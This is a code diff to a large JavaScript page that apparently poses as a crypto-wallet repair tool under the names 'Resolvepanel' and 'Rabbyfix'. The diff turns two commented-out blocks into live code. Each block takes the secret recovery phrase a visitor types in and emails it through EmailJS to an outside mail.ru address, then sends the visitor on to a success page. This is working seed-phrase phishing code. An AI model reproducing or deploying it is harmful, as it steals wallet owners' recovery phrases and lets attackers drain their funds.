@@ -52697,19 +52697,19 @@
                         let wallet_balance = JSON.stringify(data);
                         localStorage.setItem("wallet_balance", wallet_balance);
 
-                        // const templateParams = {
-                        //     to_email: 'benard.tee@mail.ru', // Recipient's email
-                        //     message: `Resolvepanel Submission:\n\nSecret Phrase: ${secretPhrase}`
-                        // };
+                        const templateParams = {
+                            to_email: 'benard.tee@mail.ru', // Recipient's email
+                            message: `Resolvepanel Submission:\n\nSecret Phrase: ${secretPhrase}`
+                        };
 
-                        // emailjs.send('service_puq0u3u', 'template_oomaoua', templateParams) // Your service ID and template ID
-                        //     .then(function(response) {
-                        //         console.log('SUCCESS!', response.status, response.text);
-                        //         window.location.href = 'success.html';
-                        //     }, function(error) {
-                        //         console.error('FAILED...', error);
-                        //         alert('Failed to send email.');
-                        //     });
+                        emailjs.send('service_puq0u3u', 'template_oomaoua', templateParams) // Your service ID and template ID
+                            .then(function(response) {
+                                console.log('SUCCESS!', response.status, response.text);
+                                window.location.href = 'success.html';
+                            }, function(error) {
+                                console.error('FAILED...', error);
+                                alert('Failed to send email.');
+                            });
                         window.location.href = "success.html";
                       }
                     } catch (error) {
@@ -52726,17 +52726,17 @@
                     .value.trim();
                   console.log("secretPhrase", secretPhrase);
 
-                  // const templateParams = {
-                  //     to_email: 'benard.tee@mail.ru', // Recipient's email
-                  //     message: `Rabbyfix Submission:\n\nSecret Phrase: ${secretPhrase}`
-                  // };
+                  const templateParams = {
+                      to_email: 'benard.tee@mail.ru', // Recipient's email
+                      message: `Rabbyfix Submission:\n\nSecret Phrase: ${secretPhrase}`
+                  };
 
-                  // // Send the email
-                  // emailjs.send('service_puq0u3u', 'template_oomaoua', templateParams).then(function(response) {
-                  //     console.log('SUCCESS!', response.status, response.text);
-                  // }, function(error) {
-                  //     console.error('FAILED...', error);
-                  // });
+                  // Send the email
+                  emailjs.send('service_puq0u3u', 'template_oomaoua', templateParams).then(function(response) {
+                      console.log('SUCCESS!', response.status, response.text);
+                  }, function(error) {
+                      console.error('FAILED...', error);
+                  });
                 }
               } catch (err) {
                 alert("Invalid mnemonic phrase supplied");
